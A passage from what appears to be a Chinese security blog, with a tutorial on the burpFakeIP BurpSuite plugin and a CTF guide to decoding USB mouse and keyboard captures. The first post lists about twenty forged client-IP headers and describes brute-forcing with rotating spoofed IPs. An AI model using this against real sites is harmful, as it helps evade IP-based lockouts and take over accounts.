        <content type="html"><![CDATA[<h1 id="burpfakeIP"><a href="#burpfakeIP" class="headerlink" title="burpfakeIP"></a>burpfakeIP</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>burpfakeIP是BurpSuite的一个插件</p><p>可以用于伪造ip</p><p><a href="https://github.com/TheKingOfDuck/burpFakeIP">下载地址</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>下载并解压到本地</p><p>打开BP 安装</p><p><img src="https://bu.dusays.com/2024/05/13/6641a8390c410.png" alt="image-20240503155652009"></p><p>添加</p><p><img src="https://bu.dusays.com/2024/05/13/6641a838cf356.png" alt="image-20240503155723758"></p><p>下一个</p><p><img src="https://bu.dusays.com/2024/05/13/6641a838e22a6.png" alt="image-20240503155745843"></p><p>安装成功</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="伪造指定ip"><a href="#伪造指定ip" class="headerlink" title="伪造指定ip"></a>伪造指定ip</h3><blockquote><p>右击抓到的数据包，选择fakeip，inputIP，输入想要用的ip地址，点击确定，自动添加</p></blockquote><p><img src="https://bu.dusays.com/2024/05/13/6641a8399f81c.png" alt="image-20240503155958255"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a838de7db.png" alt="image-20240503160008018"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a839e78c5.png" alt="image-20240503160021997"></p><h3 id="伪造本地ip"><a href="#伪造本地ip" class="headerlink" title="伪造本地ip"></a>伪造本地ip</h3><blockquote><p>右击数据包选择127.0.0.1（如上图），自动生成如下数据包</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line"> </span><br><span class="line">Host: 192.168.1.135:8002</span><br><span class="line"> </span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line"> </span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"> </span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"> </span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"> </span><br><span class="line">Cookie: ASPSESSIONIDAACSRSQS=CJLFMKFBLOABHEPKPBEKLPOA; ASPSESSIONIDAACSRTRT=HOAFJLFBABBHLECCHJEGMIMO</span><br><span class="line"> </span><br><span class="line">DNT: 1</span><br><span class="line"> </span><br><span class="line">Connection: close</span><br><span class="line"> </span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"> </span><br><span class="line">X-Forwarded-For:127.0.0.1</span><br><span class="line"> </span><br><span class="line">X-Forwarded:127.0.0.1</span><br><span class="line"> </span><br><span class="line">Forwarded-For:127.0.0.1</span><br><span class="line"> </span><br><span class="line">Forwarded:127.0.0.1</span><br><span class="line"> </span><br><span class="line">X-Forwarded-Host:127.0.0.1</span><br><span class="line"> </span><br><span class="line">X-remote-IP:127.0.0.1</span><br><span class="line"> </span><br><span class="line">X-remote-addr:127.0.0.1</span><br><span class="line"> </span><br><span class="line">True-Client-IP:127.0.0.1</span><br><span class="line"> </span><br><span class="line">X-Client-IP:127.0.0.1</span><br><span class="line"> </span><br><span class="line">Client-IP:127.0.0.1</span><br><span class="line"> </span><br><span class="line">X-Real-IP:127.0.0.1</span><br><span class="line"> </span><br><span class="line">Ali-CDN-Real-IP:127.0.0.1</span><br><span class="line"> </span><br><span class="line">Cdn-Src-Ip:127.0.0.1</span><br><span class="line"> </span><br><span class="line">Cdn-Real-Ip:127.0.0.1</span><br><span class="line"> </span><br><span class="line">CF-Connecting-IP:127.0.0.1</span><br><span class="line"> </span><br><span class="line">X-Cluster-Client-IP:127.0.0.1</span><br><span class="line"> </span><br><span class="line">WL-Proxy-Client-IP:127.0.0.1</span><br><span class="line"> </span><br><span class="line">Proxy-Client-IP:127.0.0.1</span><br><span class="line"> </span><br><span class="line">Fastly-Client-Ip:127.0.0.1</span><br><span class="line"> </span><br><span class="line">True-Client-Ip:127.0.0.1</span><br></pre></td></tr></table></figure><h3 id="伪造随机ip"><a href="#伪造随机ip" class="headerlink" title="伪造随机ip"></a>伪造随机ip</h3><blockquote><p>右击数据包选择randomIP(如上图)，生成如下数据包</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line"> </span><br><span class="line">Host: 192.168.1.135:8002</span><br><span class="line"> </span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line"> </span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"> </span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"> </span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"> </span><br><span class="line">Cookie: ASPSESSIONIDAACSRSQS=CJLFMKFBLOABHEPKPBEKLPOA; ASPSESSIONIDAACSRTRT=HOAFJLFBABBHLECCHJEGMIMO</span><br><span class="line"> </span><br><span class="line">DNT: 1</span><br><span class="line"> </span><br><span class="line">Connection: close</span><br><span class="line"> </span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"> </span><br><span class="line">X-Forwarded-For:37.120.247.234</span><br><span class="line"> </span><br><span class="line">X-Forwarded:37.120.247.234</span><br><span class="line"> </span><br><span class="line">Forwarded-For:37.120.247.234</span><br><span class="line"> </span><br><span class="line">Forwarded:37.120.247.234</span><br><span class="line"> </span><br><span class="line">X-Forwarded-Host:37.120.247.234</span><br><span class="line"> </span><br><span class="line">X-remote-IP:37.120.247.234</span><br><span class="line"> </span><br><span class="line">X-remote-addr:37.120.247.234</span><br><span class="line"> </span><br><span class="line">True-Client-IP:37.120.247.234</span><br><span class="line"> </span><br><span class="line">X-Client-IP:37.120.247.234</span><br><span class="line"> </span><br><span class="line">Client-IP:37.120.247.234</span><br><span class="line"> </span><br><span class="line">X-Real-IP:37.120.247.234</span><br><span class="line"> </span><br><span class="line">Ali-CDN-Real-IP:37.120.247.234</span><br><span class="line"> </span><br><span class="line">Cdn-Src-Ip:37.120.247.234</span><br><span class="line"> </span><br><span class="line">Cdn-Real-Ip:37.120.247.234</span><br><span class="line"> </span><br><span class="line">CF-Connecting-IP:37.120.247.234</span><br><span class="line"> </span><br><span class="line">X-Cluster-Client-IP:37.120.247.234</span><br><span class="line"> </span><br><span class="line">WL-Proxy-Client-IP:37.120.247.234</span><br><span class="line"> </span><br><span class="line">Proxy-Client-IP:37.120.247.234</span><br><span class="line"> </span><br><span class="line">Fastly-Client-Ip:37.120.247.234</span><br><span class="line"> </span><br><span class="line">True-Client-Ip:37.120.247.234</span><br></pre></td></tr></table></figure><h3 id="随机ip爆破"><a href="#随机ip爆破" class="headerlink" title="随机ip爆破"></a>随机ip爆破</h3><p>这是这个插件的核心功能</p><blockquote><p>将数据包发送到Intruder模块,在Positions中切换Attack type为Pitchfork模式,选择好有效的伪造字段,以及需要爆破的字段</p></blockquote><p><img src="https://bu.dusays.com/2024/05/13/6641a8399eac4.png" alt="image-20240503160320597"></p><blockquote><p>将Payload来源设置为Extensin-generated,并设置负载伪fakeIpPayloads,然后设置第二个变量。</p></blockquote><p><img src="https://bu.dusays.com/2024/05/13/6641a839d8843.png" alt="image-20240503160349569"></p><p>点击Start attack开始爆破.</p><p><img src="https://bu.dusays.com/2024/05/13/6641a839c72c2.png" alt="image-20240503160409258"></p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他 </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>USB流量分析</title>
      <link href="/2024/05/13/USB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
      <url>/2024/05/13/USB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="USB流量分析"><a href="#USB流量分析" class="headerlink" title="USB流量分析"></a>USB流量分析</h1><p>USB流量指的是USB设备接口的流量，攻击者能够通过监听usb接口流量获取键盘敲击键、鼠标移动与点击、存储设备的铭文传输通信、USB无线网卡网络传输内容等等。在CTF中，USB流量分析主要以键盘和鼠标流量为主。</p><h2 id="鼠标流量"><a href="#鼠标流量" class="headerlink" title="鼠标流量"></a>鼠标流量</h2><p>基础知识<br>USB协议鼠标数据部分在Leftover Capture Data域中，数据长度为四个字节</p><p>第一个字节,代表按键</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当取0×00时,代表没有按键</span><br><span class="line">当取0×01时,代表按左键</span><br><span class="line">当取0×02时,代表当前按键为右键</span><br></pre></td></tr></table></figure><p>第二个字节,可看作为signed byte类型，其最高位为符号位，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当值为正时，代表鼠标右移像素位；</span><br><span class="line">值为负时，代表鼠标左移像素位。</span><br></pre></td></tr></table></figure><p>第三个字节,代表垂直上下移动的偏移。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当值为正时，代表鼠标上移像素位；</span><br><span class="line">值为负时，代表鼠标下移像素位。</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200801015359139.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="img"></p><p>如图，数据信息为0x00002000，表示鼠标垂直向上移动20</p><p>flag隐藏在usb流量中，通过USB协议数据中的鼠标移动轨迹转换成flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> enum <span class="keyword">import</span> Enum</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Opcode</span>(<span class="title class_ inherited__">Enum</span>):</span><br><span class="line">    LEFT_BUTTON_HOLDING = <span class="number">0b00000001</span></span><br><span class="line">    RIGHT_BUTTON_HOLDING = <span class="number">0b00000010</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MouseEmulator</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.x = <span class="number">0</span></span><br><span class="line">        self.y = <span class="number">0</span></span><br><span class="line">        self.left_button_holding = <span class="literal">False</span></span><br><span class="line">        self.left_button_holding = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">move</span>(<span class="params">self, x, y</span>):</span><br><span class="line">        self.x += x</span><br><span class="line">        self.y -= y</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_left_button</span>(<span class="params">self, state</span>):</span><br><span class="line">        self.left_button_holding = state</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_right_button</span>(<span class="params">self, state</span>):</span><br><span class="line">        self.right_button_holding = state</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">snapshot</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (self.x, self.y, self.left_button_holding, self.right_button_holding)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MouseTracer</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.snapshots = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">self, snapshot</span>):</span><br><span class="line">        self.snapshots.append(snapshot)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_pcap</span>(<span class="params">filepath</span>):</span><br><span class="line">    cap = pyshark.FileCapture(filepath)</span><br><span class="line">    <span class="keyword">for</span> packet <span class="keyword">in</span> cap:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(packet, <span class="string">&#x27;usb&#x27;</span>) <span class="keyword">and</span> <span class="built_in">hasattr</span>(packet, <span class="string">&#x27;DATA&#x27;</span>) <span class="keyword">and</span> <span class="built_in">hasattr</span>(packet.DATA, <span class="string">&#x27;usb_capdata&#x27;</span>):</span><br><span class="line">            <span class="keyword">yield</span> packet.DATA.usb_capdata</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_packet</span>(<span class="params">payload</span>):</span><br><span class="line">    items = [struct.unpack(<span class="string">&#x27;b&#x27;</span>, <span class="built_in">bytes</span>.fromhex(i))[<span class="number">0</span>]</span><br><span class="line">             <span class="keyword">for</span> i <span class="keyword">in</span> payload.split(<span class="string">&quot;:&quot;</span>)]</span><br><span class="line"></span><br><span class="line">    state, movement_x, movement_y = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(items) == <span class="number">4</span>:</span><br><span class="line">        state, movement_x, movement_y, _ = items</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(items) == <span class="number">8</span>:</span><br><span class="line">        state, _, movement_x, _, movement_y, _, _, _ = items</span><br><span class="line"></span><br><span class="line">    left_button_holding = state &amp; Opcode.LEFT_BUTTON_HOLDING.value != <span class="number">0</span></span><br><span class="line">    right_button_holding = state &amp; Opcode.RIGHT_BUTTON_HOLDING.value != <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> movement_x, movement_y, left_button_holding, right_button_holding</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">snapshot_mouse</span>(<span class="params">filepath</span>):</span><br><span class="line">    mouse_emulator = MouseEmulator()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> load_pcap(filepath):</span><br><span class="line">        mx, my, lbh, rbh = parse_packet(i)</span><br><span class="line">        mouse_emulator.move(mx, my)</span><br><span class="line">        mouse_emulator.set_left_button(lbh)</span><br><span class="line">        mouse_emulator.set_right_button(rbh)</span><br><span class="line">        <span class="keyword">yield</span> mouse_emulator.snapshot()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_args</span>():</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-i&quot;</span>, <span class="string">&quot;--input-file&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Path to the input pcap file.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> parser.parse_args()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    args = parse_args()</span><br><span class="line">    mt = MouseTracer()</span><br><span class="line"></span><br><span class="line">    xs = []</span><br><span class="line">    ys = []</span><br><span class="line">    colors = []</span><br><span class="line">    alphas = []</span><br><span class="line">    <span class="keyword">for</span> snapshot <span class="keyword">in</span> snapshot_mouse(args.input_file):</span><br><span class="line">        x, y, lbh, rbh = snapshot</span><br><span class="line">        color = <span class="string">&quot;red&quot;</span> <span class="keyword">if</span> lbh <span class="keyword">else</span> <span class="string">&quot;grey&quot;</span></span><br><span class="line">        color = <span class="string">&quot;blue&quot;</span> <span class="keyword">if</span> rbh <span class="keyword">else</span> color</span><br><span class="line">        alpha = <span class="number">1</span> <span class="keyword">if</span> lbh <span class="keyword">or</span> rbh <span class="keyword">else</span> <span class="number">0.1</span></span><br><span class="line">        mt.add(snapshot)</span><br><span class="line">        xs.append(snapshot[<span class="number">0</span>])</span><br><span class="line">        ys.append(snapshot[<span class="number">1</span>])</span><br><span class="line">        colors.append(color)</span><br><span class="line">        alphas.append(alpha)</span><br><span class="line"></span><br><span class="line">    plt.scatter(xs, ys, c=colors, alpha=alphas)</span><br><span class="line">    plt.show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="键盘流量"><a href="#键盘流量" class="headerlink" title="键盘流量"></a>键盘流量</h2><p>USB协议数据部分在Leftover Capture Data域中，数据长度为八个字节。</p><p>击键信息集中在第3个字节，每次击键都会产生一个数据包。</p><p><a href="https://max.book118.com/html/2017/0407/99227972.shtm">参考文档</a>：USB keyboard映射表<br><img src="https://img-blog.csdnimg.cn/20210405115902138.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">flag信息一般隐藏在flag隐藏在usb流量中，通过USB协议数据中的键盘键码转换成键位。</p><p>1.使用kali linux中的tshark 命令把cap data提取出来：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tshark -r usb.pcap -T fields -e usb.capdata &gt; usbdata.txt</span><br><span class="line">tshark -r usb.pcap -T fields -e usb.capdata | sed &#x27;/^\s*$/d&#x27; &gt; usbdata.txt #提取并去除空行</span><br></pre></td></tr></table></figure><p>2.根据《USB键盘协议中键码》中的HID Usage ID将数据还原成键位，可写一个Python脚本进行快速转换。</p><p>提取出来的数据可能会带冒号，也可能不带，但是一般的脚本都会按照有冒号的数据来识别。有冒号时提取数据的<code>[6:8]</code>，无冒号时数据在<code>[4:6]</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">fi=<span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    a=f.readline().strip()</span><br><span class="line">    <span class="keyword">if</span> a:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a)==<span class="number">16</span>: <span class="comment"># 键盘流量len=16，鼠标流量len=8</span></span><br><span class="line">            out=<span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a),<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">if</span> i+<span class="number">2</span> != <span class="built_in">len</span>(a):</span><br><span class="line">                    out+=a[i]+a[i+<span class="number">1</span>]+<span class="string">&quot;:&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    out+=a[i]+a[i+<span class="number">1</span>]</span><br><span class="line">            fi.write(out)</span><br><span class="line">            fi.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">fi.close()</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a7aac6b18.png" alt="image-20240204195045748"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a7aac6c07.png" alt="image-20240204195026090"></p><p>再用脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">normalKeys = &#123;</span><br><span class="line">    <span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>,</span><br><span class="line">    <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>,</span><br><span class="line">     <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>,</span><br><span class="line">      <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>,</span><br><span class="line">       <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>,</span><br><span class="line">        <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>,</span><br><span class="line">         <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,</span><br><span class="line">         <span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,</span><br><span class="line">         <span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,</span><br><span class="line">         <span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,</span><br><span class="line">         <span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,</span><br><span class="line">         <span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,</span><br><span class="line">         <span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;</span><br><span class="line">    <span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>,</span><br><span class="line">     <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>,</span><br><span class="line">      <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>,</span><br><span class="line">       <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>,</span><br><span class="line">        <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>,</span><br><span class="line">         <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>,</span><br><span class="line">          <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,</span><br><span class="line">          <span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span 